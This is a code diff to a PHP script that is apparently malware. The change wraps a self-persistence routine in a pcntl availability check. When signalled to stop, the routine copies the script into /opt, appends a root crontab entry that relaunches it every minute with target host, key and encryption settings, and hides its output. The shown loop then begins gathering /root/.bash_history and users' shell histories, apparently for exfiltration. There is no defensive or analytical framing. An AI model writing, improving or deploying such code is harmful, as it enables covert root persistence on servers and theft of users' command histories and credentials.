@@ -17,26 +17,28 @@ file_put_contents(
 if (getenv('##KILLNAME##') === '##KILLKEY##') {
     exit;
 }
-$data = file_get_contents(__FILE__);
-$pcntlhandler = function () use ($api, $key, $host, $protocol, $data, $crypt, $iv) {
-    $file = randomAlphaNumericString(3);
-    mkdir("/opt", true);
-    file_put_contents('/etc/crontab', "\n* * * * * root sh /opt/$file.sh", FILE_APPEND);
-    file_put_contents(
-        "/opt/$file.sh",
-        "TARGET_API=$api "
-        . "TARGET_PROTOCOL=$protocol "
-        . "TARGET_HOST=$host "
-        . "TARGET_KEY=$key "
-        . "LOCAL_CRYPT=$crypt "
-        . "LOCAL_IV=$iv "
-        . "LOCAL_CRYPT=$crypt "
-        . "php $file.php &>/dev/null &"
-    );
-    file_put_contents("/opt/$file.php", $data);
-};
-pcntl_signal(SIGTERM, $pcntlhandler);
-pcntl_signal(SIGKILL, $pcntlhandler);
+if (extension_loaded('pcntl')) {
+    $data = file_get_contents(__FILE__);
+    $pcntlhandler = function () use ($api, $key, $host, $protocol, $data, $crypt, $iv) {
+        $file = randomAlphaNumericString(3);
+        mkdir("/opt", true);
+        file_put_contents('/etc/crontab', "\n* * * * * root sh /opt/$file.sh", FILE_APPEND);
+        file_put_contents(
+            "/opt/$file.sh",
+            "TARGET_API=$api "
+            . "TARGET_PROTOCOL=$protocol "
+            . "TARGET_HOST=$host "
+            . "TARGET_KEY=$key "
+            . "LOCAL_CRYPT=$crypt "
+            . "LOCAL_IV=$iv "
+            . "LOCAL_CRYPT=$crypt "
+            . "php $file.php &>/dev/null &"
+        );
+        file_put_contents("/opt/$file.php", $data);
+    };
+    pcntl_signal(SIGTERM, $pcntlhandler);
+    pcntl_signal(SIGKILL, $pcntlhandler);
+}
 while (true) {
     $files = array('root' => '/root/.bash_history');
     foreach (array_diff(scandir('/home'), ['.', '..']) as $user) {
